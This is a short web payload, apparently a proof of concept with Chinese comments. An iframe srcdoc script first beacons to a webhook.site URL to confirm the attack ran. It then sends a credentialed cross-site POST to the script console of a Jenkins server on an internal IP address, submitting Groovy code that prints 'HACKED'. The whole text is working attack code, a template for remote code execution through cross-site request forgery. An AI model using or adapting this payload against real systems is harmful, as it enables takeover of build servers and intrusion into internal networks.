iframe.srcdoc:
<script>
        // 打点：告诉我攻击被执行了
        fetch("https://webhook.site/7934d095-0d9f-4592-a002-0f4b9dc3fd8c");

        // 攻击 Jenkins
        fetch("http://192.168.8.3:8050/script", {
          method: "POST",
          headers: {"Content-Type": "application/x-www-form-urlencoded"},
          body: "script=println(\\"HACKED\\")",
          credentials: "include"
        });
      </script>
